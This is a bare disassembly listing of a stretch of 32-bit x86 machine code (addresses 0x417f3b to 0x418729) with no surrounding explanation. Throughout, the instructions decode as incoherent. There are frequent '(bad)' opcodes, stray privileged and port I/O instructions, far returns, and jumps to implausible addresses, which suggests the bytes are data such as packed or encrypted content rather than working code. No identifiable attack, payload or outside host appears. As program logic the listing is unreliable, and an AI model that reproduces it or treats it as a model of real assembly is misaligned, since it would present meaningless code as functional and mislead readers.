  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
